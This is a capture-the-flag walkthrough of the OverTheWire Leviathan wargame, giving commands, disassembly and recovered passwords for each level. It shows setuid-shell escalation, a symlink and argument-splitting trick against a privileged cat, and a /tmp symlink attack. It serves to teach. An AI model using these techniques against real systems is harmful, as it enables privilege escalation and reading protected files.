# OverTheWire Leviathan — Solutions

Live solves against `leviathan.labs.overthewire.org:2223` in this run. For each level:
goal, technique and why it works, exact commands, and verification. Recordings in
`recordings/leviathan/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.
---
## Level 0 → leviathan1
- **Account:** `leviathan0`, password `leviathan0` (given by the game).
- **Goal:** The password for leviathan1 is stored somewhere in leviathan0's home directory.
- **Technique and why it works:** `ls -la` shows a hidden `.backup` directory readable by group `leviathan0`. Its only file is `bookmarks.html`, a large Firefox bookmark export. Searching it for the next account name finds an entry whose URL text contains the password. The data is plain text in a backup that was never meant to be hidden from this account.
- **Commands:**
  ```
  ssh leviathan0@leviathan.labs.overthewire.org -p 2223     # password leviathan0
  ls -la .backup
  grep -i "leviathan1" .backup/bookmarks.html
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Start from the home directory.** `ls -la` lists nothing interesting — the home itself is not writable, so the level's data must be somewhere else. Adding the `-a` flag is what surfaces dotfiles/dot-directories:
   ```
   ls -la
   ```
2. **Notice the hidden directory.** The listing shows
   ```
   drwxr-x--- 2 leviathan1 leviathan0 4096 .backup
   ```
   The `x` in the group triad and the `leviathan0` group ownership mean we can traverse it; without `-a` it is invisible.
3. **Look inside it.**
   ```
   ls -la .backup
   # -rw-r----- 1 leviathan1 leviathan0 133259 bookmarks.html
   ```
   One 133 KB file, group-readable by us.
4. **Identify the format.** `file .backup/bookmarks.html` → HTML document; `head -c 200` shows a Netscape/Firefox bookmark export (`<!DOCTYPE NETSCAPE-Bookmark-file-1>`). It is plain text, so ordinary text tools work.
5. **Search it for the next account name rather than reading 133 KB by eye.** `grep` is the right tool because we know what we are looking for — the level tells us the password belongs to `leviathan1`:
   ```
   grep -i "leviathan1" .backup/bookmarks.html
   ```
6. **Read the hit.** One line matches, and its `HREF` text is the password itself:
   ```
   <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later,
   the password for leviathan1 is PiXaSWQqHq" ...>password to leviathan1</A>
   ```
7. **Verify by logging in.** `ssh leviathan1@... -p 2223` with `PiXaSWQqHq` → `whoami` prints `leviathan1`.
- **Password for leviathan1:** `PiXaSWQqHq`
- **Verification:** logged in as `leviathan1` with this password (`whoami` → `leviathan1`).
- **Recording:** `recordings/leviathan/L0.cast`

## Level 1 → leviathan2
- **Account:** `leviathan1`.
- **Goal:** The home directory contains `check`, a setuid binary owned by leviathan2. Get leviathan2's password.
- **Technique and why it works:** `check` is a setuid-root-style helper: it is owned by `leviathan2` and has the setuid bit, so it runs with leviathan2's effective UID. The binary asks for a password and compares it; `strings` shows fragments `secr`, `love`, and the prompt. The accepted input is `sex` (the comparison is against that word). When the comparison succeeds the program calls `setreuid()` to switch to leviathan2 and `system("/bin/sh")`, dropping us into a shell as leviathan2. From that shell, `cat /etc/leviathan_pass/leviathan2` works. The level shows a hardcoded-password check plus a setuid shell as the escalation primitive.
- **Commands:**
  ```
  ssh leviathan1@leviathan.labs.overthewire.org -p 2223
  file check; strings check | grep -iE 'secr|love|password'
  ./check        # enter: sex
  id             # uid=leviathan2
  cat /etc/leviathan_pass/leviathan2
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Inventory the home directory.** `ls -la` shows one executable, `check`, and the permissions tell us what we are dealing with:
   ```
   ls -l check
   # -r-sr-x--- 1 leviathan2 leviathan1 15080 check
   ```
   The `s` in the owner-execute position is the setuid bit, and the owner is `leviathan2`: running it makes our **effective** UID leviathan2.
2. **Confirm the file type.** `file check` → `setuid ELF 32-bit LSB executable, Intel i386, ... not stripped`. "Not stripped" matters: symbol names survive, so `objdump`/`nm` will name functions for us.
3. **Read the strings before doing anything clever.** `strings` is the cheapest first pass on a stripped-or-not binary:
   ```
   strings check | grep -iE "secr|love|password|sh"
   # secr
   # love
   # password:
   # /bin/sh
   # Wrong password, Good Bye ...
   ```
   The presence of `/bin/sh` says a shell is spawned somewhere; the fragments `secr` and `love` are the two halves of a hardcoded string. Note the fragments are *separate*: the compiler stored `"secr"` at `[ebp-0x13]` and `"love"` at `[ebp-0x18]`, so the concatenation `"secret"`/`"love"` order is not obvious from `strings` alone.
4. **Disassemble `main` to see the real logic.** This is the step that turns guesses into facts:
   ```
   objdump -d -M intel check | sed -n '/<main>:/,/ret/p'
   ```
   The interesting instructions:
   ```
   80491f3: mov DWORD PTR [ebp-0x20],0x786573     ; 0x786573 = "sex\0"  -> the stored password
   80491fa: mov DWORD PTR [ebp-0x13],0x72636573   ; "secr"
   8049201: mov DWORD PTR [ebp-0x10],0x746572     ; "ret\0"  -> "secret" spans -0x13..-0x10
   8049208: mov DWORD PTR [ebp-0x1c],0x646f67     ; "god\0"
   804920f: mov DWORD PTR [ebp-0x18],0x65766f6c   ; "love"   -> "godlove"
   ```
   Then three `getchar()` calls store the first three characters at `[ebp-0x24]`, `[ebp-0x23]`, `[ebp-0x22]` with a NUL at `[ebp-0x21]`, and `strcmp(user_input, [ebp-0x20])` is called. The comparison target is the *literal* `"sex"` — the `secret`/`godlove` strings are decoys that are never compared. So the answer is `sex`, not `secretlove`.
5. **Prove the flow with a tracer instead of trusting the listing.** `ltrace` shows library calls in order:
   ```
   ltrace -n 2 ./check <<< sex
   # printf("password: ")
   # getchar(...) = 115   ('s')
   # getchar(...) = 101   ('e')
   # getchar(...) = 120   ('x')
   # strcmp("sex", "sex") = 0
   # geteuid() = 12001 ; geteuid() = 12001 ; setreuid(12001, 12001) = 0
   # system("/bin/sh")
   ```
   This is the confirmation that a match leads to `setreuid(euid,euid)` (both arguments are the *effective* UID, i.e. leviathan2) and then `/bin/sh`.
6. **Run it interactively and use the shell.** The recording drives it over the PTY:
   ```
   ./check          # password: sex
   # [You've got shell]!  or a plain $ prompt
   id               # uid=12002(leviathan2) gid=12001(leviathan1)
   cat /etc/leviathan_pass/leviathan2
   # ERJ9jTYWXE
   ```
7. **Verify.** `ssh leviathan2@... -p 2223` with `ERJ9jTYWXE` → `whoami` prints `leviathan2`.
- **Password for leviathan2:** `ERJ9jTYWXE`
- **Verification:** logged in as `leviathan2` with this password.
- **Recording:** `recordings/leviathan/L1.cast`

## Level 2 → leviathan3
- **Account:** `leviathan2`.
- **Goal:** The setuid binary `printfile` (owned by leviathan3) prints a file. Read leviathan3's password.
- **Technique and why it works:** `printfile` first calls `access()` on the path we give it — an access check performed with *our* real UID, so it only passes for files we can already read — and then builds a shell command `"/bin/cat %s"` with that path. Two bugs combine. First, `access()` and the later `cat` disagree about the path: we can make `access()` succeed on a path whose *prefix* is a symlink to the password file. We create `/tmp/l2/a` as a symlink to `/etc/leviathan_pass/leviathan3`, and a real, readable file named `/tmp/l2/a b` (with a space). `access("/tmp/l2/a b")` succeeds because that real file exists and we can read it. But `/bin/cat %s` is word-split by the shell, so cat receives two arguments: `/tmp/l2/a` (the symlink, now resolved with the setuid binary's privileges) and `b`. Cat prints the symlinked password file. The classic TOCTOU/argument-splitting flaw.
- **Commands:**
  ```
  ssh leviathan2@leviathan.labs.overthewire.org -p 2223
  rm -rf /tmp/l2; mkdir -p /tmp/l2
  ln -s /etc/leviathan_pass/leviathan3 /tmp/l2/a
  touch "/tmp/l2/a b"
  ./printfile "/tmp/l2/a b"
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Check the permissions first.** `ls -l printfile` → `-r-sr-x--- 1 leviathan3 leviathan2`: setuid to leviathan3, and `file` confirms a 32-bit setuid ELF. So whatever this program does with its own privileges is our escalation path.
2. **Read the strings.** This level's strings give away the whole mechanism:
   ```
   strings printfile | grep -E "Usage|cat|Cant"
   # Usage: %s filename
   # /bin/cat %s
   ```
   The program builds a **shell command** from our filename with `snprintf`, so any metacharacter or word-splitting in the argument reaches `/bin/sh`.
3. **Read the disassembly to find the exact order of checks.**
   ```
   objdump -d -M intel printfile | sed -n '/<main>:/,/ret/p'
   ```
   Two calls stand out:
   ```
   8049248: push 0x4 ; push argv[1] ; call access@plt     ; access(argv[1], R_OK)
   8049255: je 804926e                                     ; if access()==0 continue
   ...
   8049279: push argv[1] ; push "/bin/cat %s" ; push 0x1ff ; lea [ebp-0x20c] ; call snprintf@plt
   80492a4: call setreuid@plt                              ; become leviathan3
   80492b6: call system@plt                                ; system("cat <our string>")
   ```
   So the order is: `access(path, R_OK)` **as us**, then build the command, then `setreuid(geteuid(),geteuid())` to leviathan3, then `system()`. The check and the use are two *different* interpretations of the same string — that is the bug.
4. **Work out the mismatch.** `access()` takes the path as one string, so `/tmp/l2/a b` must be a real file we can read. `system()` hands the string to `/bin/sh`, which splits it on whitespace, so cat sees `/tmp/l2/a` and `b`. The two halves need not describe the same file. Build a directory where `/tmp/l2/a` is a symlink to the password file (unreadable to us, readable to leviathan3) and `/tmp/l2/a b` is a real, empty, readable file:
   ```
   rm -rf /tmp/l2; mkdir -p /tmp/l2
   ln -s /etc/leviathan_pass/leviathan3 /tmp/l2/a
   touch "/tmp/l2/a b"
   ls -la /tmp/l2
   # lrwxrwxrwx a -> /etc/leviathan_pass/leviathan3
   # -rw-rw-r-- a b
   ```
5. **Test the pieces before the exploit.** `cat "/tmp/l2/a b"` prints nothing (it is the empty file); `cat /tmp/l2/a` as ourselves fails with `Permission denied`, which proves the symlink really points at a file only leviathan3 can read. That is exactly the setup we need.
6. **Run the binary with the crafted path.**
   ```
   ./printfile "/tmp/l2/a b"
   # PiEpxxknZH
   # cat: b: No such file or directory
   ```
   The first line is the password printed by the privileged `cat` through the symlink; the second is the harmless error for the second word `b`. The error message is itself the proof that the argument was split.
7. **Verify.** `ssh leviathan3@... -p 2223` with `PiEpxxknZH` → `whoami` prints `leviathan3`.
- **Password for leviathan3:** `PiEpxxknZH`
- **Verification:** logged in as `leviathan3` with this password.
- **Recording:** `recordings/leviathan/L2.cast`

## Level 3 → leviathan4
- **Account:** `leviathan3`.
- **Goal:** The setuid binary `level3` (owned by leviathan4) asks for a password; supply it to get leviathan4's password.
- **Technique and why it works:** `strings` shows the comparison target `snlprintf` and a `/bin/sh` string. Disassembly of `do_stuff` confirms the flow: `fgets` reads a line, `strcmp` compares it with `snlprintf`; on a match it prints a success line, calls `setreuid(geteuid(), geteuid())` to become leviathan4, and runs `system("/bin/sh")`. Entering `snlprintf` therefore drops us into a shell as leviathan4, from which we read `/etc/leviathan_pass/leviathan4`. This is the same hardcoded-password + setuid-shell pattern as level 1, but with a longer, non-dictionary password found by reading the binary.
- **Commands:**
  ```
  ssh leviathan3@leviathan.labs.overthewire.org -p 2223
  strings level3 | grep -E 'snlp|bin/sh'
  ./level3        # enter: snlprintf
  id              # uid=leviathan4
  cat /etc/leviathan_pass/leviathan4
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Check the target.** `ls -l level3` → `-r-sr-x--- 1 leviathan4 leviathan3`; setuid to leviathan4. The binary is the only escalation path, so we need it to run something of our choosing with its privileges.
2. **Strings first, as always.**
   ```
   strings level3 | grep -E "snlp|Enter the password|bin/sh"
   # snlp
   # /bin/sh
   # Enter the password>
   ```
   `snlp` is a truncated-looking fragment; `/bin/sh` says the program runs a shell.
3. **Disassemble `do_stuff` to see the comparison and what follows it.**
   ```
   objdump -d -M intel level3 | sed -n '/<do_stuff>:/,/ret/p'
   ```
   The key instructions:
   ```
   80491eb: mov DWORD PTR [ebp-0x117],0x706c6e73   ; "snlp"
   80491f5: mov DWORD PTR [ebp-0x113],0x746e6972   ; "rint"
   80491ff: mov DWORD PTR [ebp-0x110],0x0a6674     ; "tf\n"  -> "snlprintf\n"
   ...
   804921e: call fgets@plt                          ; fgets(buf, 0x100, stdin)
   8049237: call strcmp@plt                         ; strcmp(buf, "snlprintf\n")
   8049241: jne 804927e                             ; mismatch -> error path
   804924b: call puts@plt                           ; "[You've got shell]!"
   8049264: call setreuid@plt                       ; setreuid(geteuid(),geteuid())
   ...      call system@plt                          ; system("/bin/sh")
   ```
   Reassembling the three immediates gives the exact expected string: `snlp` + `rint` + `tf\n` = **`snlprintf`** followed by the newline that `fgets` keeps.
4. **Note the newline detail.** `fgets` stores the trailing `\n` in the buffer, and the literal also ends with `\n` (`0x0a6674` = `t f \n`), so `strcmp` succeeds when we type exactly `snlprintf` and press Enter. Typing an extra space would fail.
5. **Run it and supply the string.** The recording drives the interaction through a PTY (a pipe would also work):
   ```
   ./level3
   # Enter the password> snlprintf
   # [You've got shell]!
   ```
6. **Use the shell and check the identity.**
   ```
   id                        # uid=12004(leviathan4) gid=12003(leviathan3)
   cat /etc/leviathan_pass/leviathan4
   # XIyBbRwAPt
   ```
7. **Verify.** `ssh leviathan4@... -p 2223` with `XIyBbRwAPt` → `whoami` prints `leviathan4`.
- **Password for leviathan4:** `XIyBbRwAPt`
- **Verification:** logged in as `leviathan4` with this password.
- **Recording:** `recordings/leviathan/L3.cast`

## Level 4 → leviathan5
- **Account:** `leviathan4`.
- **Goal:** There is a setuid binary in the hidden `.trash` directory; run it to get leviathan5's password.
- **Technique and why it works:** `ls -la .trash` shows `bin`, mode `-r-sr-x---`, owned by leviathan5. Running it prints a sequence of 8-bit binary numbers separated by spaces, one per character of the password, ending with `00001010` (a newline). Converting each group of eight bits to its ASCII character reconstructs the password, `Bub9gZ3BGU`. No exploit is needed beyond decoding the binary's output format.
- **Commands:**
  ```
  ssh leviathan4@leviathan.labs.overthewire.org -p 2223
  ls -la .trash
  ./.trash/bin
  python3 -c "print(''.join(chr(int(b,2)) for b in '01000010 01110101 ...'.split()))"
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Find the binary.** The home directory has nothing obvious, so list everything including hidden directories:
   ```
   ls -la
   ls -la .trash
   # dr-xr-x--- 2 root leviathan4 4096 .
   # -r-sr-x--- 1 leviathan5 leviathan4 14936 bin
   ```
   `.trash` is owned by `root` but its group is `leviathan4` and it is `r-x` for the group, so we can enter it. `bin` is setuid leviathan5.
2. **Identify it.** `file .trash/bin` → `setuid ELF 32-bit LSB executable, ... not stripped`.
3. **Check what it reads.** `strings .trash/bin | grep -i leviathan` → `/etc/leviathan_pass/leviathan5`. The program opens the *next* level's password file with its own privileges — that is the whole trick, and no exploit is needed.
4. **Read the disassembly to understand the output encoding.**
   ```
   objdump -d -M intel .trash/bin | sed -n '/<main>:/,/ret/p'
   ```
   ```
   80491af: push "/etc/leviathan_pass/leviathan5" ; call fopen@plt
   80491df: call fgets@plt                 ; fgets(global_buf, 0x100, fp)
   ...
   8049207: cmp BYTE PTR [ebp-0x15],0x0    ; is the top bit set?
   804920b: jns 804921c                    ; signed -> not set
   8049210: push 0x31 ; call putchar@plt   ; '1'
   804921f: push 0x30 ; call putchar@plt   ; '0'
   8049229: shl BYTE PTR [ebp-0x15],1      ; shift the byte left
   8049230: cmp DWORD PTR [ebp-0x10],0x7   ; 8 iterations
   8049239: push 0x20 ; call putchar@plt   ; a space between characters
   ```
   So for every character of the file the program prints its eight bits, most significant first, followed by a space. The last group is `00001010` — the newline at the end of the password file.
5. **Run it and capture the output.**
   ```
   ./.trash/bin
   # 01000010 01110101 01100010 00111001 01100111 01011010 00110011 01000010 01000111 01010101 00001010
   ```
6. **Decode it.** Any tool works; the recording uses a one-liner that splits on spaces and converts each 8-bit group with `int(b, 2)`:
   ```
   python3 -c "print(''.join(chr(int(b,2)) for b in '01000010 01110101 01100010 00111001 01100111 01011010 00110011 01000010 01000111 01010101 00001010'.split()))"
   # Bub9gZ3BGU
   ```
   `01000010` = 0x42 = `B`, `01110101` = `u`, and so on; `00001010` is the newline, which the `print` turns into the line ending.
7. **Verify.** `ssh leviathan5@... -p 2223` with `Bub9gZ3BGU` → `whoami` prints `leviathan5`.
- **Password for leviathan5:** `Bub9gZ3BGU`
- **Verification:** logged in as `leviathan5` with this password.
- **Recording:** `recordings/leviathan/L4.cast`

## Level 5 → leviathan6
- **Account:** `leviathan5`.
- **Goal:** The setuid binary `leviathan5` (owned by leviathan6) reads a fixed file, `/tmp/file.log`, prints it, and deletes it. Use it to read leviathan6's password.
- **Technique and why it works:** `strings` shows the hardcoded path `/tmp/file.log` and calls to `fopen`, `fgetc`, `putchar`, and `unlink`. The program opens that path with its own (leviathan6) privileges, prints the contents character by character, then unlinks it. Because `/tmp` is world-writable and the path is fixed, we can replace `/tmp/file.log` with a symlink to `/etc/leviathan_pass/leviathan6`; the setuid program follows the symlink, reads the protected password file, and prints it. The `unlink` then removes the symlink (which is why `ls` afterwards shows the file gone). This is a symlink-following bug in a privileged program operating on a world-writable path.
- **Commands:**
  ```
  ssh leviathan5@leviathan.labs.overthewire.org -p 2223
  ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log
  ./leviathan5
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Check the binary.** `ls -l leviathan5` → `-r-sr-x--- 1 leviathan6 leviathan5`; setuid to leviathan6. The program itself is the privileged actor.
2. **Read its strings.** This immediately names the file it works on:
   ```
   strings leviathan5 | grep -E "/tmp|Cannot"
   # /tmp/file.log
   # Cannot find /tmp/file.log
   ```
3. **Confirm the behaviour from the disassembly.**
   ```
   objdump -d -M intel leviathan5 | sed -n '/<main>:/,/ret/p'
   ```
   ```
   804920f: push "/tmp/file.log" ; call fopen@plt       ; fopen("/tmp/file.log", "r")
   8049223: jne 804923f                                 ; missing -> "Cannot find ..."
   8049245: call fgetc@plt ; call feof@plt ; call putchar@plt   ; print byte by byte
   804927b: call fclose@plt
   8049283: call getuid@plt ; call setuid@plt           ; drop back to our uid
   804929c: call unlink@plt                             ; unlink("/tmp/file.log")
   ```
   Three facts fall out: the path is **hardcoded**, the program opens it **before** dropping privileges, and it **deletes** it afterwards.
4. **See the opportunity.** `/tmp` is world-writable (`ls -ld /tmp` → `drwxrwxrwt`), and the path is fixed. A symlink at `/tmp/file.log` is followed by `fopen` with leviathan6's privileges, so the program reads whatever we point at. The later `setuid(getuid())` explains why the program drops privileges first: it is about to call `unlink` on a path in a world-writable directory, and it must not let us delete arbitrary files as leviathan6.
5. **Create the symlink and run it.**
   ```
   ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log
   ./leviathan5
   # JRGj9iWNOb
   ```
6. **Note the side effect.** `ls -l /tmp/file.log` afterwards → `No such file or directory`: the `unlink` removed our symlink, not the password file. That is why the command has to create the link fresh each time.
7. **Verify.** `ssh leviathan6@... -p 2223` with `JRGj9iWNOb` → `whoami` prints `leviathan6`.
- **Password for leviathan6:** `JRGj9iWNOb`
- **Verification:** logged in as `leviathan6` with this password.
- **Recording:** `recordings/leviathan/L5.cast`

## Level 6 → leviathan7
- **Account:** `leviathan6`.
- **Goal:** The setuid binary `leviathan6` takes a 4-digit code and spawns a shell as leviathan7 if the code is right.
- **Technique and why it works:** Disassembly shows `atoi(argv[1])` compared against an immediate stored at `[ebp-0xc]`: `0x1bd3`, i.e. decimal 7123. Passing `7123` satisfies the comparison; the binary then `setreuid`s to leviathan7 and runs `/bin/sh`, so we can `cat /etc/leviathan_pass/leviathan7`. Reading the constant from the binary is faster and more reliable than trying all 10,000 codes.
- **Commands:**
  ```
  ssh leviathan6@leviathan.labs.overthewire.org -p 2223
  objdump -d -M intel leviathan6 | grep -m1 '0x1bd3'
  echo 'cat /etc/leviathan_pass/leviathan7' | ./leviathan6 7123
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Check the binary.** `ls -l leviathan6` → `-r-sr-x--- 1 leviathan7 leviathan6`; setuid to leviathan7.
2. **Disassemble `main`.**
   ```
   objdump -d -M intel leviathan6 | sed -n '/<main>:/,/ret/p'
   ```
   ```
   80491da: mov DWORD PTR [ebp-0xc],0x1bd3    ; the hardcoded code, stored at ebp-0xc
   80491e1: cmp DWORD PTR [eax],0x2           ; argc must be 2
   8049212: call atoi@plt                      ; atoi(argv[1])
   804921a: cmp DWORD PTR [ebp-0xc],eax       ; compare the constant with our number
   804921d: jne 804924a                       ; mismatch -> "Wrong code" path
   804922e: call setreuid@plt                  ; become leviathan7
   8049240: call system@plt                    ; system("/bin/sh")
   ```
3. **Read the constant.** The comparison value is right there in the instruction: `0x1bd3`. Convert it:
   ```
   python3 -c 'print(int("1bd3",16))'     # 7123
   ```
   The recording also shows the grep that finds the line directly:
   ```
   objdump -d -M intel leviathan6 | grep -m1 "0x1bd3"
   # 80491da: c7 45 f4 d3 1b 00 00  mov DWORD PTR [ebp-0xc],0x1bd3
   ```
4. **Why reading beats brute force.** A 4-digit code has 10,000 possibilities, and every wrong guess just prints an error. One disassembly line gives the answer with certainty and no guessing; the recording takes this route.
5. **Supply the code and use the shell.** `system("/bin/sh")` reads from our stdin, so the command can be piped in non-interactively:
   ```
   echo 'cat /etc/leviathan_pass/leviathan7' | ./leviathan6 7123
   # 3zrlkaPTfH
   ```
6. **Verify.** `ssh leviathan7@... -p 2223` with `3zrlkaPTfH` → `whoami` prints `leviathan7`.
- **Password for leviathan7:** `3zrlkaPTfH`
- **Verification:** logged in as `leviathan7` with this password.
- **Recording:** `recordings/leviathan/L6.cast`

## Level 7 — final level
- **Account:** `leviathan7`.
- **Goal:** Confirm the game is complete.
- **Technique and why it works:** leviathan7 is the final account. Its home contains a readable `CONGRATULATIONS` file stating "Well Done, you seem to have used a *nix system before, now try something more serious." There is no leviathan8 account, so there is nothing further to solve; this level is the end marker of the game.
- **Commands:**
  ```
  ssh leviathan7@leviathan.labs.overthewire.org -p 2223
  cat CONGRATULATIONS
  ```

### Step-by-step discovery and crafting (what the recording shows)
1. **Log in as leviathan7** with the password recovered at level 6 (`3zrlkaPTfH`).
2. **Look at the home directory.** `ls -la` shows only the usual shell dotfiles plus one non-standard entry:
   ```
   -r--r----- 1 leviathan7 leviathan7 178 CONGRATULATIONS
   ```
3. **Read it.** `cat CONGRATULATIONS`:
   ```
   Well Done, you seem to have used a *nix system before, now try something more serious.
   (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
   ```
4. **Confirm there is nothing further.** There is no `leviathan8` binary and `/etc/leviathan_pass/` has no `leviathan8` entry, so the chain ends here. The game is complete.
- **Password for leviathan8:** none — the game ends at leviathan7.
- **Verification:** login as leviathan7 succeeds; `CONGRATULATIONS` confirms completion.
- **Recording:** `recordings/leviathan/L7.cast`

